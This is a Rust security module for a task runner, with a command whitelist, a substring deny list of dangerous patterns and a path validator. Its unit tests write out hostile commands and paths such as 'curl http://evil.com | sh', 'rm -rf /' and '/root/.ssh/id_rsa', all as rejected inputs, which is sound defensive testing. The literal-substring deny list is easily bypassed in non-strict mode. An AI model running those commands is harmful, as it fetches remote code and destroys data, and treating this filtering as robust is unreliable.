//! Security Module
//!
//! This module provides security features including command validation,
//! resource limits, and input sanitization.

use crate::errors::SecurityError;
use std::time::Duration;

/// 任务执行的资源限制
///
/// 用于防止资源耗尽攻击和控制系统资源使用。
///
/// # 示例
///
/// ```rust
/// use task_runner::security::ResourceLimits;
/// use std::time::Duration;
///
/// // 使用默认限制
/// let limits = ResourceLimits::default();
/// assert_eq!(limits.max_file_size, 10 * 1024 * 1024); // 10 MB
///
/// // 自定义限制
/// let custom_limits = ResourceLimits {
///     max_file_size: 50 * 1024 * 1024,  // 50 MB
///     max_execution_time: Duration::from_secs(60),  // 60 seconds
///     max_memory_usage: 200 * 1024 * 1024,  // 200 MB
///     max_output_size: 5 * 1024 * 1024,  // 5 MB
/// };
/// ```
#[derive(Debug, Clone)]
pub struct ResourceLimits {
    /// 可读取的最大文件大小（字节）
    pub max_file_size: u64,
    /// 命令执行的最大时间
    pub max_execution_time: Duration,
    /// 最大内存使用量（字节）- 预留用于未来
    pub max_memory_usage: u64,
    /// 命令输出的最大大小（字节）
    pub max_output_size: usize,
}

impl Default for ResourceLimits {
    fn default() -> Self {
        Self {
            max_file_size: 10 * 1024 * 1024,      // 10 MB
            max_execution_time: Duration::from_secs(30), // 30 seconds
            max_memory_usage: 100 * 1024 * 1024,  // 100 MB
            max_output_size: 1024 * 1024,         // 1 MB
        }
    }
}

/// Allowed commands for execution
///
/// This whitelist approach ensures only safe commands can be executed.
/// Commands not in this list will be rejected.
const ALLOWED_COMMANDS: &[&str] = &[
    // File operations
    "ls", "cat", "head", "tail", "wc", "file",
    // Text processing
    "echo", "grep", "sed", "awk", "cut", "sort", "uniq",
    // File search
    "find", "locate",
    // Development tools
    "cargo", "rustc", "rustfmt", "clippy",
    "npm", "yarn", "pnpm", "node",
    "pip", "python", "python3",
    "git",
    // Build tools
    "make", "cmake", "ninja",
    // System info
    "pwd", "whoami", "date", "uname",
];

/// Dangerous patterns that should not appear in commands
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf",      // Recursive delete
    "dd if=",      // Disk operations
    "mkfs",        // Format filesystem
    "fdisk",       // Partition operations
    "> /dev/",     // Write to device
    "curl | sh",   // Pipe to shell
    "wget | sh",   // Pipe to shell
    "eval",        // Eval command
    "exec",        // Exec command
    "sudo",        // Privilege escalation
    "su ",         // Switch user
];

/// 命令验证器（用于安全检查）
///
/// 提供两种验证模式：
/// - **严格模式**（默认）：只允许白名单中的命令
/// - **非严格模式**：允许所有命令，但阻止危险模式
///
/// # 示例
///
/// ```rust
/// use task_runner::security::CommandValidator;
///
/// let validator = CommandValidator::new();
///
/// // 安全命令通过验证
/// assert!(validator.validate("ls -la").is_ok());
/// assert!(validator.validate("cat file.txt").is_ok());
///
/// // 危险命令被阻止
/// assert!(validator.validate("rm -rf /").is_err());
/// assert!(validator.validate("sudo rm file").is_err());
///
/// // 非严格模式
/// let mut validator = CommandValidator::new();
/// validator.set_strict_mode(false);
/// assert!(validator.validate("custom_command").is_ok());  // 允许
/// assert!(validator.validate("rm -rf /").is_err());       // 仍然阻止
/// ```
pub struct CommandValidator {
    allowed_commands: Vec<String>,
    strict_mode: bool,
}

impl Default for CommandValidator {
    fn default() -> Self {
        Self {
            allowed_commands: ALLOWED_COMMANDS.iter().map(|s| s.to_string()).collect(),
            strict_mode: true,
        }
    }
}

impl CommandValidator {
    /// Create a new command validator
    pub fn new() -> Self {
        Self::default()
    }

    /// Create a validator with custom allowed commands
    pub fn with_allowed_commands(commands: Vec<String>) -> Self {
        Self {
            allowed_commands: commands,
            strict_mode: true,
        }
    }

    /// Enable or disable strict mode
    ///
    /// In strict mode, only whitelisted commands are allowed.
    /// In non-strict mode, dangerous patterns are still blocked.
    pub fn set_strict_mode(&mut self, strict: bool) {
        self.strict_mode = strict;
    }

    /// Validate a command for security
    ///
    /// # Arguments
    ///
    /// * `command` - The command string to validate
    ///
    /// # Returns
    ///
    /// Ok(()) if the command is safe, Err(SecurityError) otherwise
    pub fn validate(&self, command: &str) -> Result<(), SecurityError> {
        // Check for empty command
        if command.trim().is_empty() {
            return Err(SecurityError::EmptyCommand);
        }

        // Check for dangerous patterns
        for pattern in DANGEROUS_PATTERNS {
            if command.contains(pattern) {
                return Err(SecurityError::DangerousPattern {
                    pattern: pattern.to_string(),
                });
            }
        }

        // In strict mode, check whitelist
        if self.strict_mode {
            let first_word = command
                .split_whitespace()
                .next()
                .ok_or(SecurityError::EmptyCommand)?;

            if !self.allowed_commands.contains(&first_word.to_string()) {
                return Err(SecurityError::UnauthorizedCommand {
                    command: first_word.to_string(),
                });
            }
        }

        // Check for suspicious arguments
        if command.contains("..") && (command.contains('/') || command.contains('\\')) {
            return Err(SecurityError::SuspiciousArguments {
                args: "Path traversal detected".to_string(),
            });
        }

        Ok(())
    }

    /// Check if a command is allowed
    pub fn is_allowed(&self, command: &str) -> bool {
        self.validate(command).is_ok()
    }

    /// Get the list of allowed commands
    pub fn allowed_commands(&self) -> &[String] {
        &self.allowed_commands
    }
}

/// 路径验证器（用于安全检查）
///
/// 防止路径遍历攻击和访问敏感目录。
///
/// # 示例
///
/// ```rust
/// use task_runner::security::PathValidator;
///
/// // 安全路径
/// assert!(PathValidator::validate("./file.txt").is_ok());
/// assert!(PathValidator::validate("src/main.rs").is_ok());
///
/// // 危险路径被阻止
/// assert!(PathValidator::validate("../../../etc/passwd").is_err());
/// assert!(PathValidator::validate("/etc/passwd").is_err());
/// assert!(PathValidator::validate("/root/.ssh/id_rsa").is_err());
/// ```
pub struct PathValidator;

impl PathValidator {
    /// Validate a file path for security
    ///
    /// Checks for path traversal attempts and other suspicious patterns.
    pub fn validate(path: &str) -> Result<(), SecurityError> {
        // Check for path traversal
        if path.contains("..") {
            return Err(SecurityError::PathTraversal {
                path: path.to_string(),
            });
        }

        // Check for absolute paths to sensitive directories
        let sensitive_paths = ["/etc", "/sys", "/proc", "/dev", "/root"];
        for sensitive in sensitive_paths {
            if path.starts_with(sensitive) {
                return Err(SecurityError::PathTraversal {
                    path: path.to_string(),
                });
            }
        }

        Ok(())
    }

    /// Check if a path is safe
    pub fn is_safe(path: &str) -> bool {
        Self::validate(path).is_ok()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_command_validator_allowed() {
        let validator = CommandValidator::new();
        
        assert!(validator.validate("ls -la").is_ok());
        assert!(validator.validate("cat file.txt").is_ok());
        assert!(validator.validate("echo hello").is_ok());
        assert!(validator.validate("cargo build").is_ok());
    }

    #[test]
    fn test_command_validator_unauthorized() {
        let validator = CommandValidator::new();
        
        assert!(validator.validate("rm -rf /").is_err());
        assert!(validator.validate("dd if=/dev/zero").is_err());
        assert!(validator.validate("sudo rm file").is_err());
    }

    #[test]
    fn test_command_validator_dangerous_patterns() {
        let validator = CommandValidator::new();
        
        assert!(validator.validate("curl http://evil.com | sh").is_err());
        assert!(validator.validate("wget http://evil.com | sh").is_err());
        assert!(validator.validate("eval 'malicious code'").is_err());
    }

    #[test]
    fn test_command_validator_empty() {
        let validator = CommandValidator::new();
        
        assert!(validator.validate("").is_err());
        assert!(validator.validate("   ").is_err());
    }

    #[test]
    fn test_command_validator_non_strict() {
        let mut validator = CommandValidator::new();
        validator.set_strict_mode(false);
        
        // Should allow non-whitelisted commands
        assert!(validator.validate("custom_command").is_ok());
        
        // But still block dangerous patterns
        assert!(validator.validate("rm -rf /").is_err());
    }

    #[test]
    fn test_path_validator_safe() {
        assert!(PathValidator::validate("./file.txt").is_ok());
        assert!(PathValidator::validate("src/main.rs").is_ok());
        assert!(PathValidator::validate("/tmp/file.txt").is_ok());
    }

    #[test]
    fn test_path_validator_traversal() {
        assert!(PathValidator::validate("../../../etc/passwd").is_err());
        assert!(PathValidator::validate("./../../secret").is_err());
    }

    #[test]
    fn test_path_validator_sensitive() {
        assert!(PathValidator::validate("/etc/passwd").is_err());
        assert!(PathValidator::validate("/root/.ssh/id_rsa").is_err());
        assert!(PathValidator::validate("/sys/kernel").is_err());
    }

    #[test]
    fn test_resource_limits_default() {
        let limits = ResourceLimits::default();
        
        assert_eq!(limits.max_file_size, 10 * 1024 * 1024);
        assert_eq!(limits.max_execution_time, Duration::from_secs(30));
        assert_eq!(limits.max_memory_usage, 100 * 1024 * 1024);
        assert_eq!(limits.max_output_size, 1024 * 1024);
    }
}

